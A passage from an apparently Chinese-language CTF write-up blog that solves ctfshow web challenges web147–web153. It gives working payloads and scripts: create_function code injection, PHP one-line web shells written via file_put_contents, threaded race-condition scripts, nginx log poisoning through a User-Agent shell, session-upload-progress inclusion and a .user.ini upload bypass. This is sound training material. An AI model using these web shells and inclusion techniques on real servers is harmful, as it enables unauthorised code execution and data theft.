class="line">                url_j = <span class="string">&#x27;%&#x27;</span> + hex_j</span><br><span class="line">                <span class="comment"># c是我们要构造的参数，比如说我们要传ls命令，l就要拆分成a|b，其中|是因为题目没有过滤|，我们可以修改成其他任意操作如^</span></span><br><span class="line">                c = op_dict[mode](<span class="built_in">ord</span>(urllib.parse.unquote(url_i)), <span class="built_in">ord</span>(urllib.parse.unquote(url_j)))</span><br><span class="line">                <span class="comment"># 如果c是可见的字符</span></span><br><span class="line">                <span class="keyword">if</span> c &gt;= <span class="number">32</span> <span class="keyword">and</span> c &lt;= <span class="number">126</span>:</span><br><span class="line">                    f.write(<span class="built_in">chr</span>(c) + <span class="string">&quot; &quot;</span> + url_i + <span class="string">&quot; &quot;</span> + url_j + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg,file_name,mode</span>):</span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(file_name, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;&quot;</span>+sign[mode]+<span class="string">&quot;\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;rce.txt&#x27;</span></span><br><span class="line">mode = <span class="string">&#x27;xor_op&#x27;</span></span><br><span class="line">reg = <span class="string">&#x27;^\W+$&#x27;</span></span><br><span class="line">generate_coding(file_name,reg,<span class="literal">True</span>,mode)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function：&quot;</span>),file_name,mode) + action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command：&quot;</span>),file_name,mode) + <span class="string">&quot;;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure></li>
</ul>
<h4><span id="web147">web147</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>考察点：create_function()代码注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&#x27;echo $a.&quot;123&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 类似</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;123&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>那么如果我们第二个参数传入 echo 1;}phpinfo(); 等价于执行后面的命令</p>
<p><strong>在PHP的命名空间默认为<code>\</code>，所有的函数和类都在<code>\</code>这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</strong></p>
<p>%5c就是\的url编码，直接写斜杠能过</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">get: <span class="title">show</span>=<span class="title">echo</span> 123;&#125;<span class="title">system</span>(&#x27;<span class="title">tac</span> <span class="title">f</span>*&#x27;);//</span></span><br><span class="line"><span class="function"># <span class="title">or</span></span></span><br><span class="line"><span class="function"><span class="title">get</span>: <span class="title">show</span>=<span class="title">echo</span> 123;&#125;<span class="title">system</span>(&#x27;<span class="title">tac</span> <span class="title">f</span>*&#x27;);/*</span></span><br><span class="line"><span class="function"><span class="title">post</span>: <span class="title">ctf</span>=\<span class="title">create_function</span></span></span><br></pre></td></tr></table></figure>

<h4><span id="web149">web149</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<ul>
<li><p>思路一：写入index.php一句话木马</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">get: <span class="title">ctf</span>=<span class="title">index.php</span></span></span><br><span class="line"><span class="function"><span class="title">post</span>: <span class="title">show</span>=&lt;?<span class="title">php</span> <span class="title">phpinfo</span>();<span class="title">eval</span>($<span class="title">_POST</span>[0]);?&gt;</span></span><br></pre></td></tr></table></figure>


</li>
<li><p>思路二：条件竞争</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        url = <span class="string">&quot;http://5b684686-4c1c-4d84-8426-b24cff7e49c3.challenge.ctf.show:8080/&quot;</span>+<span class="string">&quot;?ctf=4.php&quot;</span></span><br><span class="line">        fromdata=&#123;<span class="string">&quot;show&quot;</span>:<span class="string">&quot;&lt;?php eval($_GET[&#x27;S&#x27;]);?&gt;&quot;</span>&#125;</span><br><span class="line">        response = requests.post(url=url,data=fromdata)</span><br><span class="line">        <span class="built_in">print</span>(response.status_code)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">global</span> flag</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        <span class="comment">#cmd = &quot;system(&#x27;ls /&#x27;)&quot;</span></span><br><span class="line">        url = <span class="string">&quot;http://5b684686-4c1c-4d84-8426-b24cff7e49c3.challenge.ctf.show:8080/4.php?S=system(&#x27;tac /ctfshow_fl0g_here.txt&#x27;);&quot;</span></span><br><span class="line">        response = requests.get(url=url)</span><br><span class="line">        <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            flag = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># threads = []</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># t1 = threading.Thread(target=write)</span></span><br><span class="line"><span class="comment"># t2 = threading.Thread(target=read)</span></span><br><span class="line"><span class="comment"># threads.append(t1)</span></span><br><span class="line"><span class="comment"># threads.append(t2)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        t1 = threading.Thread(target=write)</span><br><span class="line">        t1.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        t1.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        t2 = threading.Thread(target=read)</span><br><span class="line">        t2.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        t2.start()</span><br><span class="line">    <span class="comment"># for t in threads:</span></span><br><span class="line">    <span class="comment">#     t.join()</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">while</span> flag:</span><br><span class="line">    time.sleep(<span class="number">0.01</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<h4><span id="web150">web150</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤字符</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用日志包含</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?isVIP=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0ffe1355-5551-4386-992e-70c1c9f7197b.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&lt;?php eval($_POST[0]);?&gt;</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>55</span><br><span class="line"></span><br><span class="line"><span class="language-arcade">ctf=<span class="regexp">/var/</span><span class="built_in">log</span>/nginx/access.<span class="built_in">log</span>&amp;<span class="number">0</span>=system(<span class="string">&#x27;tac flag.php&#x27;</span>);</span></span><br></pre></td></tr></table></figure>

<h4><span id="web150plus">web150plus</span></h4><ul>
<li>方法一：autoload()</li>
</ul>
<blockquote>
<p>这个题一点点小坑__autoload()函数不是类里面的__</p>
<p><code>__autoload() //在代码中当调用不存在的类时会自动调用该方法。</code><br>class_exists也能触发,不过在于怎么给<code>$__CTFSHOW__</code>赋值,因为下划线被过滤了,只要能绕过下划线就可以了<br>最后构造?..CTFSHOW..&#x3D;phpinfo就可以看到phpinfo信息啦<br>原因是..CTFSHOW..解析变量成__CTFSHOW__然后进行了变量覆盖，因为CTFSHOW是类就会使用<br>__autoload()函数方法，去加载，因为等于phpinfo就会去加载phpinfo<br>接下来就去getshell啦</p>
</blockquote>
<ul>
<li><p>方法二：条件竞争</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/13795170.html">利用PHP_SESSION_UPLOAD_PROGRESS进行文件包含</a></p>
<blockquote>
<p>这个包含漏洞在php5.4之后可以使用</p>
<p>因为在php5.4之后php.ini开始有了几个session的默认选项</p>
<p>1.session.upload_progress.enabled &#x3D; on<br>2.session.upload_progress.cleanup &#x3D; on<br>3.session.upload_progress.prefix &#x3D; “upload_progress_”<br>4.session.upload_progress.name &#x3D; “PHP_SESSION_UPLOAD_PROGRESS”<br>5.session.use_strict_mode&#x3D;off</p>
<p>第一个表示当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中<br>第二个表示当文件上传结束后，php将会立即清空对应session文件中的内容<br>第三和第四个prefix+name将表示为session中的键名<br>第五个表示我们对Cookie中sessionID可控<br>我们可以利用session.upload_progress将木马写入session文件，然后包含这个session文件因为session.use_strict_mode&#x3D;off所以session的文件名我们是可控的，比如添加一个Cookie:PHPSESSID&#x3D;flag,PHP将会在服务器上创建一个文件sess_flag，还有session.upload_progress.cleanup &#x3D; on默认开启所以在我们传入一句话木马就会被立即删除，所以我们要用条件竞争来进行包含</p>
<p>写个脚本跑一下</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">url = <span class="string">&#x27;http://de6906e6-f354-48f4-960d-5a479b6ec627.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;利用PHP_SESSION_UPLOAD_PROGRESS将木马写入session。在session.upload_progress.name=&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;的条件下上传文件就会把这次上传的信息存储在/tmp/sess_flag中&#x27;&#x27;&#x27;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php system(&quot;tac f*&quot;);?&gt;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;创建一个文件用来上传进行条件竞争&#x27;&#x27;&#x27;</span></span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">10</span>)</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;以session的方式post上传PHPSESSID和要执行的语句&#x27;&#x27;&#x27;</span></span><br><span class="line">        response = session.post(url,cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;flag&#x27;</span>&#125;, data=data, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;dota.txt&#x27;</span>, f)&#125;)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;这里猜测session文件在tmp目录下&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="string">&#x27;ctf&#x27;</span>:<span class="string">&#x27;/tmp/sess_flag&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;获取文件包含过后的返回数据&#x27;&#x27;&#x27;</span></span><br><span class="line">        response = session.post(url+<span class="string">&#x27;?isVIP=1&#x27;</span>,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;retry&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;实例化下session&#x27;&#x27;&#x27;</span></span><br><span class="line">    session = requests.session()</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;创建多个线程,一个thread对象代表一个线程&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        threading.Thread(target=read, args=(session,)).start()</span><br></pre></td></tr></table></figure></li>
</ul>
<h3><span id="文件上传">文件上传</span></h3><p><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/vip_mmles/topics/1547397">.htaccess 和.user.ini 配置文件妙用</a></p>
<ul>
<li><p>标签</p>
<blockquote>
<p>有时候会屏蔽php的标签<?php?></p>
<p>我们可以用短标签</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt;<span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;<span class="meta">?&gt;</span>         <span class="comment">//short_open_tags=on</span></span><br><span class="line"></span><br><span class="line">&gt;<span class="meta">&lt;?=</span>(表达式)<span class="meta">?&gt;</span> 等价于 <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (表达式)<span class="meta">?&gt;</span> <span class="comment">//无限制</span></span><br><span class="line"></span><br><span class="line">&gt;&lt;% <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;%&gt;         <span class="comment">//asp_tags=on php_version &lt; 7</span></span><br><span class="line"></span><br><span class="line">&gt;&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>; &lt;/script&gt; <span class="comment">//php_vsesion &lt; 7</span></span><br></pre></td></tr></table></figure>

</blockquote>
</li>
</ul>
<h4><span id="web153">web153</span></h4><ul>
<li>使用ini绕过，先抓包修改上传ini文件</li>
</ul>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1a6d1184-db8d-4671-a858-56d5451f64fd.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>205</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarysSdVv9iA9wMCmOIg</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://1a6d1184-db8d-4671-a858-56d5451f64fd.challenge.ctf.show</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://1a6d1184-db8d-4671-a858-56d5451f64fd.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundarysSdVv9iA9wMCmOIg</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;.user.ini&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: image/png</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">auto_prepend_file = <span class="number">1.</span>png</span></span><br><span class="line"><span class="language-pgsql"><span 